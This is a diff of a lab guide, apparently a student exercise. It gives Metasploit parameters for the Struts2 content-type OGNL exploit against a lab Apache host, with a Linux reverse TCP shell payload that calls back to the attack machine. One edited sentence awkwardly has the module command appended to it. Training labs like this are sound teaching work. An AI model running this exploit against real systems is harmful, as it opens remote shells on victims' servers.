@@ -143,12 +143,12 @@ Enter the command `sudo msfconsole` to start Metasploit.   The sudo password is 
 
 <div class="step" id="step-012"><a href="#step-012" style="font-weight:bold">Step 012</a></div>  
 
-Enter the following parameters for the attack. The Apache Outside NAT IP can be found in the student Excel workbook.  Use the `ifconfig` command to determine the ATTACK MACHINE IP.  You do not need to exit the msfconsole to run ifconfig.
+Enter the following parameters for the attack. The Apache Outside NAT IP can be found in the student Excel workbook.  Use the `ifconfig` command to determine the ATTACK MACHINE IP.  You do not need to exit the msfconsole to run ifconfig use multi/http/struts2_content_type_ognl.
 
 ```
 set rhost <APACHE OUTSIDE NAT IP>
 set rport 8080
-set targeturl /showcase.action
+set targeturi /showcase.action
 set payload linux/x64/shell/reverse_tcp
 set lhost <ATTACK MACHINE IP>
 set lport 80
